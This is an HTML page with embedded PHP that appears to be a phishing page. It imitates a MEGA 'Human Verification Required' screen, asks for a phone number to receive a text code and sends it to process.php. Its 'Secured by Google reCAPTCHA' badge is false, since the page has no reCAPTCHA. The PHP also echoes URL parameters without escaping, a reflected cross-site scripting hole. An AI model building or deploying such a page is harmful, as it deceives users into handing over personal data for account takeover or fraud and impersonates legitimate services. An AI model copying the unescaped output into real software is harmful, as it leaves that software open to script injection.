<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <style>
        body {
            background-color: #f4f4f4;
            color: #333;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
        }

        .header {
            width: 100%;
            padding: 10px 20px;
            background-color: #ffffff; /* Changed to white for better contrast */
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        .header img {
            width: 100px; /* Adjust the logo size */
        }

        .verification-container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
            margin-top: 30px;
        }

        .verification-container h1 {
            font-size: 22px;
            margin-bottom: 15px;
        }

        .verification-container p {
            font-size: 16px;
            color: #666;
        }

        .input-group {
            margin: 15px 0;
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        select, input[type="text"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        button {
            background-color: #e50914;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }

        button:hover {
            background-color: #d40813;
        }

        #errorMessage {
            color: red;
            margin-top: 10px;
            display: none;
        }

        .recaptcha-text {
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #999;
            font-size: 12px;
        }

        .recaptcha-text img {
            margin-right: 8px;
            width: 20px;
        }

        /* Mobile-specific styles */
        @media (max-width: 600px) {
            .header img {
                width: 80px; /* Smaller logo on mobile */
            }

            .verification-container {
                width: 95%;
                padding: 15px;
            }

            .verification-container h1 {
                font-size: 20px;
            }

            .input-group {
                margin: 10px 0;
            }

            button {
                font-size: 14px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>

    <div class="header">
        <img src="mega_logo.png" alt="MEGA Logo">
    </div>

    <div class="verification-container">
        <h1>Human Verification Required</h1>
        <p>Please enter your phone number to verify your identity.</p><div class="verification-container">
        <p>A verification code will be sent via text message.</p>
        <form action="process.php" method="POST">
            <div class="input-group">
                <select name="countryCode" id="countryCode">
                        <option value="+1">+1 (USA)</option>
						<option value="+44">+44 (UK)</option>
						<option value="+91">+91 (India)</option>
						<option value="+61">+61 (Australia)</option>
						<option value="+81">+81 (Japan)</option>
						<option value="+49">+49 (Germany)</option>
						<option value="+33">+33 (France)</option>
						<option value="+34">+34 (Spain)</option>
						<option value="+39">+39 (Italy)</option>
						<option value="+86">+86 (China)</option>
						<option value="+7">+7 (Russia)</option>
						<option value="+55">+55 (Brazil)</option>
						<option value="+27">+27 (South Africa)</option>
						<option value="+64">+64 (New Zealand)</option>
						<option value="+66">+66 (Thailand)</option>
						<option value="+90">+90 (Turkey)</option>
						<option value="+92">+92 (Pakistan)</option>
						<option value="+34">+34 (Mexico)</option>
						<option value="+62">+62 (Indonesia)</option>
						<option value="+351">+351 (Portugal)</option>
						<option value="+52">+52 (Mexico)</option>
						<option value="+48">+48 (Poland)</option>
						<option value="+82">+82 (South Korea)</option>
                    <!-- Add other country codes here -->
                </select>
                <input type="text" name="phoneNumber" id="phoneNumber" placeholder="Phone Number">
            </div>
            <button type="submit" id="submitPhoneNumber">Verify</button>
        </form>
        <?php
        if (isset($_GET['error'])) {
            echo "<p id='errorMessage' style='display: block;'>{$_GET['error']}</p>";
        } elseif (isset($_GET['success'])) {
            echo "<p id='errorMessage' style='display: block;'>{$_GET['success']}</p>";
        }
        ?>
    </div>

    <p class="recaptcha-text">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google Logo">
        Secured by Google reCAPTCHA.
    </p>

</body>
</html>
